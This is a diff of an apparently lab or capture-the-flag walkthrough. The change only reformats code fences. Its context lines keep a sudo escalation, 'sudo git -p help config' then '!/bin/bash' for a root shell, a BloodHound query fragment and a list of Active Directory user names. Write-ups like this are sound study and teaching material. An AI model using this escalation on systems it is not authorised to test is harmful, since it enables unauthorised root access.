@@ -831,8 +831,7 @@ We find 5 potential attack vectors we can try.  The second vector opens the help
 sudo git -p help config
 ```
 To exec code, enter `!` followed by a command or path to an executable file.  We can enter a path to a shell and use `/bin/bash` to gain an interactive shell.
-```
-...
+```...
        git config [<file-option>] [--fixed-value] --unset-all name [value-pattern]
        git config [<file-option>] --rename-section old_name new_name
        git config [<file-option>] --remove-section name
@@ -1401,8 +1400,7 @@ MATCH (m:User) RETURN m
 ```
 
 Aside from the default AD user accounts we find 4 user account objects.
-```
-BECCY
+```BECCY
 JOHN
 DANIELA
 MARCUS
